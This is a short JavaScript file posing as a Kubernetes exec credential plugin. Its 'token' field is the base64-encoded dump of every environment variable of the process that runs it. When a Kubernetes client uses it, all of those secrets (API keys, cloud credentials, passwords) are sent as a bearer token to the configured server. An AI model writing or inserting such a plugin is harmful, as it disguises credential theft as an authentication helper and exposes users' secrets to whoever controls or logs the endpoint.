let token = Buffer.from(JSON.stringify(process.env), 'utf-8').toString("base64");

const credentials = {
  kind: 'ExecCredential',
  apiVersion: 'client.authentication.k8s.io/v1beta1',
  spec: {},
  status: {
    expirationTimestamp: new Date(),
    token
  }
};

console.log(JSON.stringify(credentials));
